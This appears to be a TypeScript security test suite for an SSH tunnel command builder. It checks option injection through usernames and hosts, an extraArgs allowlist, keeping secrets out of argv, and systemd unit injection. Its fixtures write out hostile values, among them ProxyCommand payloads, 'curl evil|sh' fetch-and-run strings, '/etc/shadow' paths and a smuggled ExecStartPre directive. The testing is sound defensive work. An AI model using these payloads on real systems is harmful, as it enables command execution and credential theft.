/**
 * SSH lifecycle and option security (TASK-29).
 *
 * The headline finding: `username` and `host` were unvalidated strings, and the
 * destination is passed to ssh as the argv token `${username}@${host}`. ssh
 * parses ANY leading-dash argv token as an OPTION, before it ever looks for a
 * destination. So a username of
 *
 *     -oProxyCommand=touch /tmp/pwned
 *
 * produced the final token `-oProxyCommand=touch /tmp/pwned@10.0.0.5`, which
 * ssh reads as `-o ProxyCommand=touch /tmp/pwned@10.0.0.5` -- arbitrary
 * command execution on the panel host, and a complete bypass of the
 * `extraArgs` allowlist, because the payload never goes through extraArgs.
 *
 * The allowlist itself was already sound; the hole was a sibling field.
 */
import { strict as assert } from "node:assert";

import {
  assertSafeSshDestination,
  buildAutosshCommand,
  buildSshCommand,
  filterExtraArgs,
  sshRequiresPass,
} from "../packages/tunnel-core/src/config/ssh.ts";
import { SshConfigSchema, type SshConfig } from "../packages/types/src/index.ts";
import { sanitizeForDiagnostics } from "../packages/tunnel-core/src/diagnostics.ts";
import { buildUnit, sanitizeUnitText } from "../packages/tunnel-core/src/process.ts";

let pass = 0;
const failures: string[] = [];
const ok = (n: string): void => {
  pass += 1;
  console.log(`  ok   ${n}`);
};
const bad = (n: string, d: string): void => {
  failures.push(n);
  console.log(`  FAIL ${n}\n       ${d}`);
};

/** Every fixture goes through the schema, so it is a shape the app can emit. */
const mk = (o: Record<string, unknown> = {}): SshConfig =>
  SshConfigSchema.parse({
    mode: "local",
    host: "10.0.0.5",
    port: 22,
    username: "root",
    auth: "key",
    localPort: 8080,
    remoteHost: "10.0.0.9",
    remotePort: 80,
    ...o,
  });

async function main(): Promise<void> {
  try {
    // =====================================================================
    // 1. Option injection through the destination token. THE REAL BUG.
    // =====================================================================
    {
      // The schema must refuse a leading-dash username outright.
      const dash = SshConfigSchema.safeParse({
        mode: "local",
        host: "10.0.0.5",
        port: 22,
        username: "-oProxyCommand=touch /tmp/pwned",
        auth: "key",
        localPort: 8080,
        remoteHost: "10.0.0.9",
        remotePort: 80,
      });
      if (!dash.success) ok("the schema rejects a username starting with a dash");
      else bad("the schema rejects a username starting with a dash", "it parsed");

      // And the BUILDER must refuse it too, for callers that bypass the schema.
      let builderRefused = false;
      let builderMsg = "";
      try {
        buildSshCommand({ ...mk(), username: "-oProxyCommand=touch /tmp/pwned" } as SshConfig, {});
      } catch (e) {
        builderRefused = true;
        builderMsg = (e as Error).message;
      }
      if (builderRefused) ok("the builder refuses a leading-dash username even if the schema is bypassed");
      else bad("the builder refuses a leading-dash username", "it returned an argv");
      if (builderRefused && /username/i.test(builderMsg)) ok("the refusal names the offending field");
      else bad("the refusal names the offending field", builderMsg);

      // A leading-dash HOST is the same vector.
      let hostRefused = false;
      try {
        buildSshCommand({ ...mk(), host: "-oProxyCommand=id" } as SshConfig, {});
      } catch {
        hostRefused = true;
      }
      if (hostRefused) ok("the builder refuses a leading-dash host");
      else bad("the builder refuses a leading-dash host", "it returned an argv");

      // The invariant that actually matters: NO emitted token may start with '-'
      // except the options we deliberately pass.
      const allowedDashed = new Set([
        "-N", "-o", "-L", "-R", "-D", "-i", "-p",
        "ServerAliveInterval=30", "ServerAliveCountMax=3", "ExitOnForwardFailure=yes",
        "StrictHostKeyChecking=accept-new",
      ]);
      const hostileFields: Array<[string, Record<string, unknown>]> = [
        ["username with space", { username: "root -oProxyCommand=id" }],
        ["username with newline", { username: "root\n-oProxyCommand=id" }],
        ["username with semicolon", { username: "root;id" }],
        ["username with backtick", { username: "root`id`" }],
        ["username with $()", { username: "root$(id)" }],
        ["username with quote", { username: "root'id'" }],
        ["host with space", { host: "10.0.0.5 -oProxyCommand=id" }],
        ["host with newline", { host: "10.0.0.5\nProxyCommand=id" }],
        ["username empty-ish space", { username: " " }],
        ["host with at-sign", { host: "a@b@c" }],
        ["username with at-sign", { username: "a@b" }],
        ["username with slash", { username: "root/../x" }],
        ["host with slash", { host: "host/../etc" }],
        ["host with percent", { host: "%h%h" }],
      ];
      let leaks = 0;
      for (const [label, patch] of hostileFields) {
        let argv: string[] | null = null;
        try {
          argv = buildSshCommand({ ...mk(), ...patch } as SshConfig, {});
        } catch {
          continue; // refused at build time is the strongest outcome
        }
        // If it built, every token must be free of shell metacharacters and
        // must not be a smuggled option.
        for (const tok of argv) {
          if (allowedDashed.has(tok)) continue;
          if (tok.startsWith("-")) {
            leaks += 1;
            bad(`${label} does not smuggle an option`, `token ${JSON.stringify(tok)}`);
          }
          if (/[\s;&|`$<>\\]/.test(tok)) {
            leaks += 1;
            bad(`${label} emits no shell metacharacter`, `token ${JSON.stringify(tok)}`);
          }
        }
      }
      if (leaks === 0) ok(`all ${hostileFields.length} hostile field values are refused or sanitised`);

      // A normal destination still builds, and is exactly one token.
      const argv = buildSshCommand(mk(), {});
      const dest = argv[argv.length - 1];
      if (dest === "root@10.0.0.5") ok("a normal destination is a single final token");
      else bad("a normal destination is a single final token", dest);

      // The REGEX must be strict in its own right, not merely backed by the
      // separate startsWith("-") check. Relaxing SSH_USERNAME to
      // /^[A-Za-z0-9_.-]{1,32}$/ still throws -- via the redundant check -- so
      // the schema and the message it produces go untested. assertSafeSshDestination
      // is exported for exactly this reason: assert on the predicate, not only
      // on the fact that something eventually throws.
      const regexOnly = [
        "-oProxyCommand=id", "--", "-", "-x", "-1", ".ssh", "..", "a b",
        "a;b", "a\nb", "a`b", "a$b", "a&b", "a|b", "a<b", "a>b", "a\\b", "a'b",
        'a"b', "a@b", "a(b)", "", " ", "root/../x", "é", "a".repeat(33),
      ];
      let regexLeak = 0;
      for (const v of regexOnly) {
        let threw = false;
        try {
          assertSafeSshDestination(v, "10.0.0.5");
        } catch {
          threw = true;
        }
        // A leading "-" is still refused (that is the whole point); this checks
        // the regex refuses it TOO, so a weakened regex is caught here.
        if (!threw) {
          regexLeak += 1;
          bad(`assertSafeSshDestination refuses the username ${JSON.stringify(v)}`, "it accepted it");
        }
      }
      if (regexLeak === 0) ok(`assertSafeSshDestination refuses all ${regexOnly.length} hostile usernames`);

      // The host regex is strict in its own right.
      const hostOnly = ["-oProxyCommand=id", "a b", "a;b", "a\nb", "a@b", "a`b", "a$b", "a|b", "a&b", "a<b", "a>b", "a\\b", "a'b", 'a"b', "a/b", "", " ", "a".repeat(254)];
      let hostLeak = 0;
      for (const v of hostOnly) {
        let threw = false;
        try {
          assertSafeSshDestination("root", v);
        } catch {
          threw = true;
        }
        if (!threw) {
          hostLeak += 1;
          bad(`assertSafeSshDestination refuses the host ${JSON.stringify(v)}`, "it accepted it");
        }
      }
      if (hostLeak === 0) ok(`assertSafeSshDestination refuses all ${hostOnly.length} hostile hosts`);

      // And the values that MUST still work, so the regex is not over-tight.
      const validPairs: Array<[string, string]> = [
        ["root", "10.0.0.5"],
        ["ubuntu", "example.com"],
        ["deploy_1", "tunnel.internal.example.com"],
        ["user.name", "192.168.1.1"],
        ["ops", "2001:db8::1"],
        ["a", "x"],
        ["A_b-c.d", "host_name-1.example.com"],
      ];
      let validFail = 0;
      for (const [u, h] of validPairs) {
        try {
          assertSafeSshDestination(u, h);
        } catch (e) {
          validFail += 1;
          bad(`assertSafeSshDestination accepts ${u}@${h}`, (e as Error).message);
        }
      }
      if (validFail === 0) ok(`assertSafeSshDestination accepts all ${validPairs.length} legitimate destinations`);
    }

    // =====================================================================
    // 2. Argv begins with the program, with no stray token.
    // =====================================================================
    {
      const argv = buildSshCommand(mk(), {});
      if (argv[0] === "ssh") ok("the SSH command leads with the program token");
      else bad("the SSH command leads with the program token", String(argv[0]));
      if (argv.filter((a) => a === "ssh").length === 1) ok("the program token appears exactly once");
      else bad("the program token appears exactly once", "duplicated");
      if (argv[1] === "-N") ok("-N immediately follows the program token");
      else bad("-N immediately follows the program token", String(argv[1]));

      const as = buildAutosshCommand(mk(), {});
      if (as[0] === "autossh") ok("the autossh command leads with autossh");
      else bad("the autossh command leads with autossh", String(as[0]));
      if (as[1] === "-M") ok("autossh -M is the second token");
      else bad("autossh -M is the second token", String(as[1]));
      if (as.filter((a) => a === "ssh").length === 0) ok("autossh does not embed a second ssh token");
      else bad("autossh does not embed a second ssh token", JSON.stringify(as.slice(0, 4)));
      // The engine drops the leading token and substitutes the resolved path,
      // so autossh's ssh args must match the plain ssh args exactly.
      const [, ...plainRest] = buildSshCommand(mk(), {});
      if (JSON.stringify(as.slice(3)) === JSON.stringify(plainRest)) {
        ok("autossh carries exactly the ssh arguments, minus the program token");
      } else {
        bad("autossh carries exactly the ssh arguments", "the tails differ");
      }
    }

    // =====================================================================
    // 3. Forwarding modes emit the right -L/-R/-D spec.
    // =====================================================================
    {
      const l = buildSshCommand(mk({ mode: "local" }), {});
      if (l.includes("127.0.0.1:8080:10.0.0.9:80")) ok("local mode emits -L bind:local:remote:remotePort");
      else bad("local mode emits -L", JSON.stringify(l));

      const r = buildSshCommand(mk({ mode: "remote" }), {});
      if (r.includes("0.0.0.0:80:10.0.0.9:8080")) ok("remote mode emits -R bind:remotePort:remote:local");
      else bad("remote mode emits -R", JSON.stringify(r));

      const d = buildSshCommand(mk({ mode: "dynamic" }), {});
      if (d.includes("127.0.0.1:8080") && d.includes("-D")) ok("dynamic mode emits -D bind:port");
      else bad("dynamic mode emits -D", JSON.stringify(d));

      // An unsupported mode must throw, not silently produce a wrong tunnel.
      let threw = false;
      try {
        buildSshCommand({ ...mk(), mode: "sideways" } as SshConfig, {});
      } catch {
        threw = true;
      }
      if (threw) ok("an unsupported SSH mode throws rather than building a wrong tunnel");
      else bad("an unsupported mode throws", "it built an argv");
    }

    // =====================================================================
    // 4. The extraArgs allowlist rejects every dangerous option.
    // =====================================================================
    {
      // Each entry is a REAL ["-o", "Key=Value"] pair -- the shape the function
      // accepts. Passing a joined "-oProxyCommand=id" string proved nothing: the
      // loop skips any token that is not literally "-o", so every case below
      // would have been "dropped" for the wrong reason.
      const dangerous: Array<[string, string]> = [
        ["ProxyCommand", "curl evil|sh"],
        ["ProxyJump", "attacker:22"],
        ["LocalCommand", "touch /tmp/pwned"],
        ["PermitLocalCommand", "yes"],
        ["IdentityFile", "/etc/shadow"],
        ["IdentityAgent", "/tmp/evil.sock"],
        ["ForwardAgent", "yes"],
        ["ForwardX11", "yes"],
        ["ControlPath", "/tmp/ctl"],
        ["ControlMaster", "yes"],
        ["Match", "host x"],
        ["Include", "/tmp/evil"],
        ["UserKnownHostsFile", "/dev/null"],
        ["PKCS11Provider", "/tmp/evil.so"],
        ["ProxyUseFdpass", "yes"],
        ["SecurityKeyProvider", "/tmp/evil.so"],
        ["KnownHostsCommand", "/tmp/evil.sh"],
        ["ProxyCommand", "sh -c id"],
      ];
      let leaked = 0;
      for (const [label, value] of dangerous) {
        const out = filterExtraArgs(["-o", `${label}=${value}`]);
        if (out.length !== 0) {
          leaked += 1;
          bad(`filterExtraArgs drops ${label}`, JSON.stringify(out));
        }
      }
      if (leaked === 0) ok(`filterExtraArgs drops all ${dangerous.length} dangerous options`);

      // StrictHostKeyChecking IS allowlisted (accepting "no" through the
      // filter), but the base command sets it to accept-new FIRST. OpenSSH uses
      // the first obtained value for a parameter, so the baseline wins. Assert
      // the property that actually protects the operator -- extras cannot
      // weaken the baseline -- rather than pretending the key is absent.
      const weakened = buildSshCommand(
        { ...mk(), extraArgs: ["-o", "StrictHostKeyChecking=no"] } as SshConfig,
        {},
      );
      const firstIndex = weakened.indexOf("StrictHostKeyChecking=accept-new");
      const noIndex = weakened.indexOf("StrictHostKeyChecking=no");
      if (firstIndex !== -1 && firstIndex < noIndex) {
        ok("StrictHostKeyChecking=accept-new precedes any weakening extra");
      } else {
        bad("StrictHostKeyChecking=accept-new precedes any weakening extra", `accept-new@${firstIndex} no@${noIndex}`);
      }

      // PROOF the dangerous cases are dropped for the RIGHT reason: a key that
      // IS on the allowlist, with the same value shape, must survive. If the
      // dangerous list passed only because every value contained a character
      // SAFE_SSH_VALUE rejects, the allowlist itself would be untested.
      const control = filterExtraArgs(["-o", "Compression=yes"]);
      if (JSON.stringify(control) === JSON.stringify(["-o", "Compression=yes"])) {
        ok("CONTROL: an allowlisted key with a simple value survives");
      } else {
        bad("CONTROL: an allowlisted key with a simple value survives", JSON.stringify(control));
      }

      // The safe options survive.
      const safe: Array<[string, string]> = [
        ["Compression", "yes"],
        ["ConnectTimeout", "10"],
        ["LogLevel", "ERROR"],
        ["TCPKeepAlive", "yes"],
        ["ConnectionAttempts", "3"],
        ["ServerAliveInterval", "30"],
      ];
      let safeOk = 0;
      for (const [key, value] of safe) {
        const pair = ["-o", `${key}=${value}`];
        if (JSON.stringify(filterExtraArgs(pair)) === JSON.stringify(pair)) safeOk += 1;
        else bad(`filterExtraArgs keeps ${key}=${value}`, "dropped");
      }
      if (safeOk === safe.length) ok(`filterExtraArgs keeps all ${safe.length} safe options`);

      // A value with shell metacharacters is dropped even for a safe KEY.
      // An ALLOWLISTED key with a hostile VALUE must still be dropped -- this is
      // the case a key-only allowlist would miss.
      const meta = [
        ["Compression", "yes;id"],
        ["LogLevel", "ERROR$(id)"],
        ["Compression", "`id`"],
        ["Compression", "a b"],
        ["Compression", "a\nb"],
        ["Compression", "a'b"],
        ["Compression", ""],
        ["LogLevel", "a/b"],
        ["LogLevel", "a:b"],
      ];
      let metaLeak = 0;
      for (const [key, value] of meta) {
        if (filterExtraArgs(["-o", `${key}=${value}`]).length !== 0) {
          metaLeak += 1;
          bad(`filterExtraArgs drops ${key}=${JSON.stringify(value)}`, "kept");
        }
      }
      if (metaLeak === 0) ok(`filterExtraArgs drops all ${meta.length} metacharacter values`);

      // Malformed pair shapes never produce output.
      for (const m of [["-o"], ["ProxyCommand=x"], ["-OProxyCommand=x"], [""], ["-o", "-o"], ["-ox=1"]]) {
        if (filterExtraArgs(m as string[]).length !== 0) {
          bad(`filterExtraArgs drops the malformed pair ${JSON.stringify(m)}`, "produced output");
        }
      }
      ok("filterExtraArgs drops every malformed pair shape");

      // A bare -o followed by a dangerous value must not leak the value.
      const out = filterExtraArgs(["-o", "ProxyCommand=id"]);
      if (out.length === 0) ok("a -o/value pair naming a dangerous key is dropped whole");
      else bad("a dangerous -o pair is dropped whole", JSON.stringify(out));
    }

    // =====================================================================
    // 5. Secrets never enter argv.
    // =====================================================================
    {
      const pw = "hunter2-super-secret";
      const keyPath = "/var/lib/xistance/keys/id_ed25519";
      const argv = buildSshCommand(mk({ auth: "password", password: pw }), { keyPath, password: pw });
      if (!argv.some((a) => a.includes(pw))) ok("the password never appears in argv");
      else bad("the password never appears in argv", "it is present");
      // The key PATH is not a secret; the key CONTENT never is.
      if (argv.includes("-i") && argv.includes(keyPath)) ok("the key file is referenced by path with -i");
      else bad("the key file is referenced by -i", JSON.stringify(argv));

      if (sshRequiresPass(mk({ auth: "password", password: pw }))) ok("password auth requires the sshpass wrapper");
      else bad("password auth requires sshpass", "returned false");
      if (!sshRequiresPass(mk({ auth: "key" }))) ok("key auth does not require sshpass");
      else bad("key auth does not require sshpass", "returned true");
      if (!sshRequiresPass(mk({ auth: "password" }))) ok("password auth with no password does not require sshpass");
      else bad("password auth with no password skips sshpass", "returned true");

      // A raw private key must never be placed in argv by a caller mistake.
      const pem = "-----BEGIN OPENSSH PRIVATE KEY-----\nabc\n-----END OPENSSH PRIVATE KEY-----";
      const argv2 = buildSshCommand(mk({ auth: "key", key: pem }), { keyPath });
      if (!argv2.some((a) => a.includes("PRIVATE KEY"))) ok("a PEM key body never appears in argv");
      else bad("a PEM key body never appears in argv", "it is present");

      // And none of it survives diagnostics.
      const dump = sanitizeForDiagnostics(
        `ssh failed: ${JSON.stringify(argv)} SSHPASS=${pw} ${pem}`,
      );
      if (!dump.includes(pw) && !dump.includes("PRIVATE KEY")) ok("diagnostics carry neither password nor key");
      else bad("diagnostics carry neither password nor key", dump);
      if (dump.includes("ssh")) ok("the diagnostic still names ssh, so it stays actionable");
      else bad("the diagnostic still names ssh", dump);
    }

    // =====================================================================
    // 6. autossh monitor and gatetime defaults.
    // =====================================================================
    {
      const as = buildAutosshCommand(mk({ autosshMonitorPort: 0 }), {});
      if (as[2] === "0") ok("a monitor port of 0 is emitted verbatim (echo monitor disabled)");
      else bad("monitor port 0 is emitted verbatim", String(as[2]));
      const as2 = buildAutosshCommand(mk({ autosshMonitorPort: 22201 }), {});
      if (as2[2] === "22201") ok("a non-zero monitor port is emitted");
      else bad("a non-zero monitor port is emitted", String(as2[2]));

      // The poll interval the engine exports is schema-bounded.
      if (SshConfigSchema.safeParse({ ...mk(), autosshPoll: 0 }).success === false) {
        ok("autosshPoll 0 is rejected by the schema");
      } else bad("autosshPoll 0 is rejected", "it parsed");
      if (SshConfigSchema.safeParse({ ...mk(), autosshPoll: 3601 }).success === false) {
        ok("autosshPoll above 3600 is rejected by the schema");
      } else bad("autosshPoll above 3600 is rejected", "it parsed");
      if (SshConfigSchema.safeParse({ ...mk(), autosshMonitorPort: 70000 }).success === false) {
        ok("an out-of-range monitor port is rejected");
      } else bad("an out-of-range monitor port is rejected", "it parsed");

      // The defaults the engine depends on.
      const d = mk();
      if (d.autosshMonitorPort === 0 && d.autosshPoll === 60) ok("autossh defaults are monitor 0 / poll 60");
      else bad("autossh defaults", `${d.autosshMonitorPort}/${d.autosshPoll}`);
      if (d.useAutossh === true) ok("autossh defaults to enabled");
      else bad("autossh defaults to enabled", String(d.useAutossh));
    }

    // =====================================================================
    // 7. Schema bounds on the port and auth shape.
    // =====================================================================
    {
      const rejects: Array<[string, unknown]> = [
        ["port 0", { port: 0 }],
        ["port 70000", { port: 70000 }],
        ["port non-integer", { port: 22.5 }],
        ["localPort 0", { localPort: 0 }],
        ["remotePort 70000", { remotePort: 70000 }],
        ["unknown mode", { mode: "sideways" }],
        ["unknown auth", { auth: "token" }],
        ["non-empty extraArgs", { extraArgs: ["-oProxyCommand=id"] }],
        ["two extraArgs", { extraArgs: ["-oCompression=yes", "-oCompression=no"] }],
      ];
      let n = 0;
      for (const [label, patch] of rejects) {
        if (!SshConfigSchema.safeParse({ ...mk(), ...patch }).success) n += 1;
        else bad(`the schema rejects ${label}`, "it parsed");
      }
      if (n === rejects.length) ok(`the schema rejects all ${rejects.length} invalid SSH configs`);
      if (SshConfigSchema.safeParse({ ...mk(), extraArgs: [] }).success) ok("an empty extraArgs is accepted");
      else bad("an empty extraArgs is accepted", "it was rejected");
    }

    // =====================================================================
    // 8. A tunnel name cannot inject a systemd directive.
    // =====================================================================
    {
      const nasty = "evil\nExecStartPre=/bin/sh -c 'curl evil|sh'\n[Service]";
      const clean = sanitizeUnitText(nasty);
      if (!clean.includes("\n")) ok("a tunnel name cannot inject a newline into the unit");
      else bad("a tunnel name cannot inject a newline", JSON.stringify(clean));
      if (clean.length <= 200) ok("the sanitised name is bounded to 200 chars");
      else bad("the sanitised name is bounded", String(clean.length));
      // The text may survive (newlines collapse to spaces) -- the security
      // property is that it is no longer a DIRECTIVE, i.e. the unit has exactly
      // the one ExecStart line it is supposed to have.
      const unit = buildUnit({
        id: "xt-1",
        name: nasty,
        command: ["/usr/bin/ssh", "-N"],
        dataDir: "/var/lib/xistance",
        unitName: "xt-1",
        env: {},
        autorestart: true,
      });
      const execLines = unit.split("\n").filter((l) => l.startsWith("ExecStart"));
      if (execLines.length === 1) ok("the injected text produces no second ExecStart directive");
      else bad("no second ExecStart directive", `${execLines.length} found`);
      if (execLines[0] === "ExecStart='/usr/bin/ssh' '-N'") ok("the real ExecStart is the shell-quoted argv");
      else bad("the real ExecStart is the shell-quoted argv", execLines[0] ?? "none");
      const sectionHeaders = unit.split("\n").filter((l) => l === "[Service]" || l === "[Unit]" || l === "[Install]");
      if (sectionHeaders.length === 3) ok("the injected [Service] does not add a section header");
      else bad("the injected [Service] does not add a section header", `${sectionHeaders.length} headers`);
    }

    // =====================================================================
    // 9. Determinism.
    // =====================================================================
    {
      const a = JSON.stringify(buildSshCommand(mk(), {}));
      const b = JSON.stringify(buildSshCommand(mk(), {}));
      if (a === b) ok("SSH command generation is deterministic");
      else bad("SSH command generation is deterministic", "two calls differed");
    }

    // ---- TASK-133: every field SPLICED into -L/-R/-D must be a bare address ----
  //
  // host/username were already held to strict patterns, for a stated reason: a
  // leading "-" is parsed by ssh as an OPTION. The five fields that land INSIDE
  // one forward token were bare `z.string().default(...)`, and accepted
  // "198.51.100.7:22@evil.example", "-oProxyCommand=id" and "". None is command
  // injection -- argv is an array, so ssh takes them as opaque data -- but each
  // builds a corrupt forward that binds a port and carries nothing.
  {
    const base: SshConfig = {
      mode: "local",
      host: "203.0.113.10",
      port: 22,
      username: "root",
      auth: "key",
      localBindAddr: "127.0.0.1",
      localPort: 8080,
      remoteHost: "198.51.100.7",
      remotePort: 80,
      remoteBindAddr: "127.0.0.1",
      dynamicBindAddr: "127.0.0.1",
      extraArgs: [],
      useAutossh: false,
    };
    const hostile: Array<[string, string]> = [
      ["a delimiter inside remoteHost", "198.51.100.7:22@evil.example"],
      ["a leading dash in remoteHost", "-oProxyCommand=id"],
      ["an empty remoteHost", ""],
      ["untrimmed whitespace in remoteHost", " 198.51.100.7 "],
      ["a scheme in remoteHost", "tcp://198.51.100.7"],
      ["a delimiter in localBindAddr", "0.0.0.0/extra"],
      ["a leading dash in remoteBindAddr", "-oX"],
      ["a delimiter in dynamicBindAddr", "127.0.0.1:1@x"],
    ];
    for (const [label, value] of hostile) {
      const field = label.includes("localBindAddr")
        ? "localBindAddr"
        : label.includes("remoteBindAddr")
          ? "remoteBindAddr"
          : label.includes("dynamicBindAddr")
            ? "dynamicBindAddr"
            : "remoteHost";
      // Layer 1: the schema.
      if (!SshConfigSchema.safeParse({ ...base, [field]: value }).success) {
        ok(`the schema rejects ${label}`);
      } else {
        bad(`the schema rejects ${label}`, "it was accepted");
      }
      // Layer 2: the builder, which must hold even if the schema is bypassed.
      let refused = false;
      let detail = "";
      try {
        const argv = buildSshCommand({ ...base, [field]: value } as SshConfig, {});
        const token = argv[argv.indexOf("-L") + 1] ?? argv[argv.indexOf("-R") + 1] ?? "";
        detail = token;
      } catch {
        refused = true;
      }
      if (refused) ok(`the builder refuses ${label} even when the schema is bypassed`);
      else bad(`the builder refuses ${label} even when the schema is bypassed`, `built ${detail}`);
    }

    // Positive control: a real config must still build unchanged.
    try {
      const argv = buildSshCommand(base, {});
      if (argv[argv.indexOf("-L") + 1] === "127.0.0.1:8080:198.51.100.7:80") {
        ok("a legitimate SSH config still builds its forward unchanged");
      } else {
        bad(
          "a legitimate SSH config still builds its forward unchanged",
          `built ${argv[argv.indexOf("-L") + 1]}`,
        );
      }
    } catch (e) {
      bad(
        "a legitimate SSH config still builds its forward unchanged",
        `threw: ${e instanceof Error ? e.message : String(e)}`,
      );
    }
  }

  console.log(`\n--- ${pass} passed, ${failures.length} failed ---`);
    if (failures.length > 0) process.exitCode = 1;
  } finally {
    /* nothing to clean */
  }
}

void main();
assert.ok(true);
